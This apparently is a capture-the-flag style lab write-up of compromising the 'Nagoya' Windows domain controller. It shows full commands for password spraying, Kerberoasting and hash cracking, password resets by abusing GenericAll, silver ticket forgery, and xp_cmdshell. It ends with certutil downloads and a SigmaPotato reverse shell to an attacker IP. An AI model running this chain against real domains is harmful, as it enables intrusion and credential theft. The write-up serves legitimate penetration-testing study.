---
icon: windows
---

# Nagoya - Hard

## Gaining Access

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.21 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 05:46 EDT
Nmap scan report for 192.168.118.21
Host is up (0.032s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Nagoya Industries - Nagoya
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-23 09:48:21Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2025-09-23T09:49:55+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2025-09-22T09:45:53
|_Not valid after:  2026-03-24T09:45:53
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-23T09:49:16+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49667/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc             Microsoft Windows RPC
49678/tcp open  msrpc             Microsoft Windows RPC
49691/tcp open  msrpc             Microsoft Windows RPC
49698/tcp open  msrpc             Microsoft Windows RPC
49717/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-23T09:49:18
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   31.96 ms 192.168.45.1
2   32.03 ms 192.168.45.254
3   35.62 ms 192.168.251.1
4   35.66 ms 192.168.118.21
```

ldap gives us a domain name nagoya-industries.com. I'll add it to my /etc/hosts file.&#x20;

```
192.168.118.21 	nagoya-industries.com
```

### HTTP Port 80&#x20;

<figure><img src="../../.gitbook/assets/image (1519).png" alt=""><figcaption></figcaption></figure>

This looks like a static website,

<figure><img src="../../.gitbook/assets/image (1520).png" alt=""><figcaption></figcaption></figure>

We got a list of the team, I am going to save them to a file and try to brute force smb.

I am going to generate a list of usernames first, using [username-anarchy](https://github.com/urbanadventurer/username-anarchy)

```
~/tools/username-anarchy/username-anarchy -i users | tee usernames
```

<figure><img src="../../.gitbook/assets/image (1521).png" alt=""><figcaption></figcaption></figure>

Now that I have a list of usernames I am going to check them against [**kerbrute**](https://github.com/ropnop/kerbrute/releases) and find the valid ones:

```
kerbrute userenum --dc 192.168.118.21 -d nagoya-industries.com usernames
```

<figure><img src="../../.gitbook/assets/image (1522).png" alt=""><figcaption></figcaption></figure>

Now I have a list of valid usernames! Before trying to brute force the password, I tried AS-REP-roasting but had not luck.&#x20;

I am going to make a list of passwords, the one thing that stands out is that nagoya is everywhere on the website and the footer really stands out

<figure><img src="../../.gitbook/assets/image (1523).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1524).png" alt=""><figcaption></figcaption></figure>

```
netexec smb 192.168.118.21 -u usernames -p passwords --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (1525).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1526).png" alt=""><figcaption></figcaption></figure>

We got 2 hits! I am going to collect data for bloodhound using netexec and analyze it using one of the users

### Bloodhound

```
netexec ldap 192.168.118.21 -u andrea.hayes -p Nagoya2023 --bloodhound --collection All --dns-server 192.168.118.21
```

<figure><img src="../../.gitbook/assets/image (1527).png" alt=""><figcaption></figcaption></figure>

### List all Kerberoastable Accounts

<figure><img src="../../.gitbook/assets/image (1528).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1529).png" alt=""><figcaption></figcaption></figure>

### Kerberoasting

```
impacket-GetUserSPNs -request -dc-ip 192.168.118.21 nagoya-industries.com/andrea.hayes -save -outputfile GetUserSPNs.out
```

<figure><img src="../../.gitbook/assets/image (1530).png" alt=""><figcaption></figcaption></figure>

Now we can try cracking them using hashcat

```
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt
```

```
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (1531).png" alt=""><figcaption></figcaption></figure>

We can't do much with this user, let's do some digging. We know andrea.hayes is a member of the employees group

<figure><img src="../../.gitbook/assets/image (1532).png" alt=""><figcaption></figcaption></figure>

and that the employees group has generic all on svc\_helpdesk and iain.white

<figure><img src="../../.gitbook/assets/image (1537).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1538).png" alt=""><figcaption></figcaption></figure>

Wow we literally got a roadmap with everything we need to get access on the machine and get admin's credentials!

### Generic All Abuse

since the employees group has generic all on iain.white and iain.white is part of the helpdesk group that has generic all on christopher.lewis I am going to make a chain of password changes to get to christopher.lewis and remote into the machine

```
rpcclient -U "andrea.hayes%Nagoya2023" 192.168.118.21
```

```
setuserinfo2 iain.white 23 Password123!
```

<figure><img src="../../.gitbook/assets/image (1539).png" alt=""><figcaption></figcaption></figure>

```
rpcclient -U "iain.white%Password123!" 192.168.118.21
```

```
setuserinfo2 christopher.lewis 23 Password123!
```

<figure><img src="../../.gitbook/assets/image (1540).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1541).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1542).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Winpeas

revealed this interesting port and we already have some mssql creds we got earlier from kerberoasting. I am going to test them out

<figure><img src="../../.gitbook/assets/image (1548).png" alt=""><figcaption></figcaption></figure>

I am going to setup a tunnel with chisel so I can access the internal port

```
./chisel_1.10.1_linux_amd64 server -p 445 --reverse
```

<figure><img src="../../.gitbook/assets/image (1549).png" alt=""><figcaption></figcaption></figure>

Download chisel on my target machine and running it:

```
iwr -uri http://192.168.45.158/chisel_1.10.1_windows_amd64 -outfile chisel_1.10.1_windows_amd64.exe
```

<figure><img src="../../.gitbook/assets/image (1550).png" alt=""><figcaption></figcaption></figure>

```
.\chisel_1.10.1_windows_amd64.exe client 192.168.45.158:445 R:1433:localhost:1433
```

<figure><img src="../../.gitbook/assets/image (1551).png" alt=""><figcaption></figcaption></figure>

```
impacket-mssqlclient svc_mssql:Service1@localhost -windows-auth
```

<figure><img src="../../.gitbook/assets/image (1552).png" alt=""><figcaption></figcaption></figure>

There is nothing here

<figure><img src="../../.gitbook/assets/image (1553).png" alt=""><figcaption></figcaption></figure>

After conneting to sql serveri i just saw default databases and we can not enable xp\_cmdshell that enables us to run system command on the target machine because we don't have enough permission.

### Silver Ticket

Since `svc_mssql` is service user, we can try impersonating the administrator using silver tickets.

<figure><img src="../../.gitbook/assets/image (1544).png" alt=""><figcaption></figcaption></figure>

I have to generate the NTLM HASH for the password of svc\_sql \[Service1]. I am going to use this [**website** ](https://codebeautify.org/ntlm-hash-generator)to generate it

<figure><img src="../../.gitbook/assets/image (1545).png" alt=""><figcaption></figcaption></figure>

Domain-sid can get via powershell `Get-ADdomain`To get the SPN:

```
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
```

<figure><img src="../../.gitbook/assets/image (1546).png" alt=""><figcaption></figcaption></figure>

Once I get the ticket it should get stored in my current working directory

```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
```

<figure><img src="../../.gitbook/assets/image (1547).png" alt=""><figcaption></figcaption></figure>

Since we forwarded 1433 port to our attack machine we need to regulate /etc/hosts file according to it.

```
127.0.0.1 	nagoya.nagoya-industries.com
```

```
KRB5CCNAME=Administrator.ccache impacket-mssqlclient -k nagoya.nagoya-industries.com
```

<figure><img src="../../.gitbook/assets/image (1554).png" alt=""><figcaption></figcaption></figure>

Let's enable xp\_cmdshell that allow us to run system command on the target machine.

```
enable_xp_cmdshell
```

<figure><img src="../../.gitbook/assets/image (1555).png" alt=""><figcaption></figcaption></figure>

```
xp_cmdshell whoami /priv
```

<figure><img src="../../.gitbook/assets/image (1556).png" alt=""><figcaption></figcaption></figure>

Now we have the right to impersonate any user in the domain.

We can use [**sigmapotato**](https://github.com/tylerdotrar/SigmaPotato/releases) and impersonate the administrator user. Give ourselves a shell as the admin user

```
xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.45.158/SigmaPotato.exe C:\Temp\SigmaPotato.exe"
```

<figure><img src="../../.gitbook/assets/image (1557).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1558).png" alt=""><figcaption></figcaption></figure>

I am going to run a simple system command first:

```
xp_cmdshell "C:\Temp\SigmaPotato.exe whoami"
```

<figure><img src="../../.gitbook/assets/image (1559).png" alt=""><figcaption></figcaption></figure>

We are nt authority\system! Highest user on the domain controller. Let's get a shell as the admin user!:

```
xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell 192.168.45.158 135"
```

<figure><img src="../../.gitbook/assets/image (1560).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1561).png" alt=""><figcaption></figcaption></figure>

Yay we did it! Did drop into a rabitt hole towards the end before I remembered we had the svc\_mssql service account.
